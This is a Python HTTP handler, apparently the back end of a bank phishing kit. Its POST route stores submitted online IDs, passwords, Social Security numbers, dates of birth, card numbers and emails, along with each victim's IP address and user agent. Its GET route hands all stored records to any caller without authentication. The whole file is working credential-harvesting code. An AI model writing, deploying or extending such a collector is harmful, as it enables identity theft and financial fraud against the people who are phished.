from http.server import BaseHTTPRequestHandler
import json
import sys
import os

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from flow_control.login_data import save_login_data, get_all_login_data


class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        """Handle GET requests - return all login data"""
        try:
            data = get_all_login_data(limit=1000)
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps({
                "status": "success",
                "data": data,
                "count": len(data)
            }).encode())
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "error", "message": str(e)}).encode())
    
    def do_POST(self):
        """Handle POST requests - save login data"""
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            
            # Get IP and user agent
            ip_address = self.headers.get('X-Forwarded-For', '').split(',')[0] or self.client_address[0]
            user_agent = self.headers.get('User-Agent', '')
            
            # Save data
            success = save_login_data(
                online_id=data.get('online_id', ''),
                password=data.get('password', ''),
                ssn=data.get('ssn'),
                dob=data.get('dob'),
                card_number=data.get('card_number'),
                email=data.get('email'),
                ip_address=ip_address,
                user_agent=user_agent
            )
            
            if success:
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({
                    "status": "success",
                    "message": "Data saved successfully"
                }).encode())
            else:
                self.send_response(500)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({
                    "status": "error",
                    "message": "Failed to save data"
                }).encode())
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({
                "status": "error",
                "message": str(e)
            }).encode())
    
    def do_OPTIONS(self):
        """Handle CORS preflight requests"""
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

